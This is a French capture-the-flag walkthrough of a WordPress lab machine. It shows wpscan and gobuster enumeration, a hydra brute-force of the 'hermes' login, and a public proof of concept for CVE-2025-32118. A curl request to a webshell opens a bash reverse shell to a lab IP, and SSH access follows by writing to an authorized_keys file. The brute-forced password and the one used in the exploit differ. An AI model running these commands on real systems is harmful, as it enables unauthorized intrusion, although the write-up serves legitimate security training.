On trouve un port `22` pour ssh et un port `80` pour http.

Quand on tente d’accéder au port 80, on est rediriger sur l’adresse `pantheaon.lab` 

Avec `wapalyzer`, on trouve que le site est sur wordpress, hors souvent avec wordpress, on trouve qu’il y a pléthore de plugins vulnérable, ce qui doit donc nous motiver à trouver un plugins qui pourrait être vulnérable. 

- Pour cela on peut utiliser l’outils `wp-scan`
    
    ```bash
     wpscan --url "http://$TARGET/" --plugins-detection aggressive
    _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
    
             WordPress Security Scanner by the WPScan Team
                             Version 3.8.28
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________
    
    [+] URL: http://pantheon.god/ [192.168.56.10]
    [+] Started: Tue May 27 02:01:37 2025
    
    Interesting Finding(s):
    
    [+] Headers
     | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
    
    [+] robots.txt found: http://pantheon.god/robots.txt
     | Interesting Entries:
     |  - /wp-admin/
     |  - /wp-admin/admin-ajax.php
     | Found By: Robots Txt (Aggressive Detection)
     | Confidence: 100%
    
    [+] XML-RPC seems to be enabled: http://pantheon.god/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
    
    [+] WordPress readme found: http://pantheon.god/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] Upload directory has listing enabled: http://pantheon.god/wp-content/uploads/
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
    
    [+] The external WP-Cron seems to be enabled: http://pantheon.god/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299
    
    [+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
     | Found By: Rss Generator (Passive Detection)
     |  - http://pantheon.god/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
     |  - http://pantheon.god/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
    
    [+] WordPress theme in use: twentytwentyfive
     | Location: http://pantheon.god/wp-content/themes/twentytwentyfive/
     | Latest Version: 1.2 (up to date)
     | Last Updated: 2025-04-15T00:00:00.000Z
     | Readme: http://pantheon.god/wp-content/themes/twentytwentyfive/readme.txt
     | [!] Directory listing is enabled
     | Style URL: http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2
     | Style Name: Twenty Twenty-Five
     | Style URI: https://wordpress.org/themes/twentytwentyfive/
     | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
     | Author: the WordPress team
     | Author URI: https://wordpress.org
     |
     | Found By: Css Style In Homepage (Passive Detection)
     | Confirmed By: Css Style In 404 Page (Passive Detection)
     |
     | Version: 1.2 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: 'Version: 1.2'
    
    [+] Enumerating All Plugins (via Aggressive Methods)
     Checking Known Locations - Time: 00:04:30 <=======================================                                                                                                                                          Checking Known Locations - Time: 00:22:44 <========================> (110793 / 110793) 100.00% Time: 00:22:44[+] Checking Plugin Versions (via Passive and Aggressive Methods)     > (75092 / 110793) 67.77%  ETA: 00:06:54
    
    [i] Plugin(s) Identified:
    
    [+] akismet
     | Location: http://pantheon.god/wp-content/plugins/akismet/
     | Latest Version: 5.4
     | Last Updated: 2025-05-07T16:30:00.000Z
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://pantheon.god/wp-content/plugins/akismet/, status: 403
     |
     | The version could not be determined.
    
    [+] cmp-coming-soon-maintenance
     | Location: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/
     | Last Updated: 2025-04-30T08:07:00.000Z
     | Readme: http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
     | [!] The version is out of date, the latest version is 4.1.15
     | [!] Directory listing is enabled
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/, status: 200
     |
     | Version: 4.1.13 (80% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
    
    [+] feed
     | Location: http://pantheon.god/wp-content/plugins/feed/
     |
     | Found By: Known Locations (Aggressive Detection)
     |  - http://pantheon.god/wp-content/plugins/feed/, status: 200
     |
     | The version could not be determined.
    
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:01 <===============================> (137 / 137) 100.00% Time: 00:00:01
    
    [i] No Config Backups Found.
    
    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
    
    [+] Finished: Tue May 27 02:24:34 2025
    [+] Requests Done: 110950
    [+] Cached Requests: 44
    [+] Data Sent: 29.306 MB
    [+] Data Received: 33.036 MB
    [+] Memory used: 594.039 MB
    [+] Elapsed time: 00:22:56
    [May 27, 2025 - 02:29:55 (CE
    ```
    

Ainsi on trouve le plugin `cmp-coming-soon-maintenance` qui est sous ça version 4.1.13. On voit rapidement  des `POC`  sur internet pour cette vulnérabilité comme celui de `Nxploited`  https://github.com/Nxploited/CVE-2025-32118. 

Cependant on fais face à un problème, il faut des credentials pour lancer cette exploit, hors nous n’en avons pas.

- Mais après énumération avec `gobuster`, on trouve une note au chemins `/wp-content/notes.txt` indiquant que tout les dieux devais changer leurs mots de passe et mettre un `y` mais seul hermes ne l’avais pas fais.
    
    ```
    [Jun 22, 2025 - 21:22:15 (CEST)] exegol-pantheon_wu gobuster # gobuster dir -w `fzf-wordlists` -u http://olympe.god/wp-content -x txt,html,php
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://olympe.god/wp-content
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              txt,html,php
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.php                 (Status: 403) [Size: 275]
    /index.php            (Status: 200) [Size: 0]
    /.html                (Status: 403) [Size: 275]
    /rss                  (Status: 301) [Size: 0] [--> http://olympe.god/wp-content/feed/]
    /feed                 (Status: 301) [Size: 0] [--> http://olympe.god/wp-content/feed/]
    /themes               (Status: 301) [Size: 320] [--> http://olympe.god/wp-content/themes/]
    /uploads              (Status: 301) [Size: 321] [--> http://olympe.god/wp-content/uploads/]
    /atom                 (Status: 301) [Size: 0] [--> http://olympe.god/wp-content/feed/atom/]
    /b                    (Status: 301) [Size: 0] [--> http://olympe.god/]
    /a                    (Status: 301) [Size: 0] [--> http://olympe.god/athena-2/]
    /de                   (Status: 301) [Size: 0] [--> http://olympe.god/demeter-2/]
    /p                    (Status: 301) [Size: 0] [--> http://olympe.god/poseidon-2/]
    /d                    (Status: 301) [Size: 0] [--> http://olympe.god/demeter-2/]
    /art                  (Status: 301) [Size: 0] [--> http://olympe.god/artemis-2/]
    /h                    (Status: 301) [Size: 0] [--> http://olympe.god/hello-world/]
    /l                    (Status: 301) [Size: 0] [--> http://olympe.god/les-12-dieux/]
    /plugins              (Status: 301) [Size: 321] [--> http://olympe.god/wp-content/plugins/]
    /rss2                 (Status: 301) [Size: 0] [--> http://olympe.god/wp-content/feed/]
    /z                    (Status: 301) [Size: 0] [--> http://olympe.god/zeus-2/]
    /A                    (Status: 301) [Size: 0] [--> http://olympe.god/athena-2/]
    /ap                   (Status: 301) [Size: 0] [--> http://olympe.god/aphrodite-2/]
    /P                    (Status: 301) [Size: 0] [--> http://olympe.god/poseidon-2/]
    /wp-register.php      (Status: 301) [Size: 0] [--> http://olympe.god/wp-login.php?action=register]
    /upgrade              (Status: 301) [Size: 321] [--> http://olympe.god/wp-content/upgrade/]
    /notes.txt            (Status: 200) [Size: 391]
    /B                    (Status: 301) [Size: 0] [--> http://olympe.god/]
    /ar                   (Status: 301) [Size: 0] [--> http://olympe.god/ares-2/]
    Progress: 4569 / 882240 (0.52%)
    ```
    

On lance alors un bruteforce sur la page de login en tant que hermes et avec la wordlist rockyou.txt et on trouve le mots de passe `mondieu` 
```bash
hydra -l hermes -P `fzf-wordlists` olympe.god http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Folympe.god%2Fwp-admin%2F&testcookie=1:F=Incorrect"
```

A partir de là, on peut utiliser la CVE pour obtenir un accès `www-data` sur la machine via un revershell obtenue à travers le webshell offert par le POC de la CVE.

```bash
#POC CVE wordpress
python3 CVE-2025-32118.py -u http://olympe.god/wordpress -un hermes -p ilovegod
# Ecoute sur un portattaquant
pwncat-cs :9001
# Envoie du payload
curl "http://olympe.god/wp-content/plugins/cmp-premium-themes/nxploitedshell/nxploitedshell.php" --get --data-urlencode "cmd=bash -c 'sh -i >& /dev/tcp/192.168.56.1/9001 0>&1'"
```

Une fois sur la machine. On trouve avec `getfacl` que l’on à un droit d’écriture sur l’authorized_keys de l’utilisateur `hermès`. 
```
getfacl -R -s /
```

Ce dernier nous à laisser un message pour nous indiquer qu’il aimerai que l’on fasse tomber zeus. 

Ainsi on peut utiliser ce fichier pour y mettre notre clé publique et obtenir un accès ssh à la machine en tant que `hermès`.

